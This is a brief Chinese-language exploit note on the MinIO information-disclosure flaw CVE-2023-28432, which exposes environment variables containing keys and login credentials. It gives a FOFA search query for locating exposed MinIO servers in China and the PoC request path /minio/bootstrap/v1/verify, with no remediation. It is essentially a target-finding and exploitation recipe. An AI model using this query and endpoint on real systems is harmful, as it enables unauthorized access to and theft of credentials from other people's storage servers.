## Minio-verify信息泄露(CVE-2023-28432)

MinIO中存在一处信息泄露漏洞，由于Minio集群进行信息交换的9000端口，在未经配置的情况下通过发送特殊HPPT请求进行未授权访问，进而导致MinIO对象存储的相关环境变量泄露，环境变量中包含密钥信息。泄露的信息中包含登录账号密码。

## fofa

```
(banner="MinIO" || header="MinIO" || title="MinIO Browser") && country="CN"
```

## poc

```
/minio/bootstrap/v1/verify
```

![image-20240604123832575](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406041238644.png)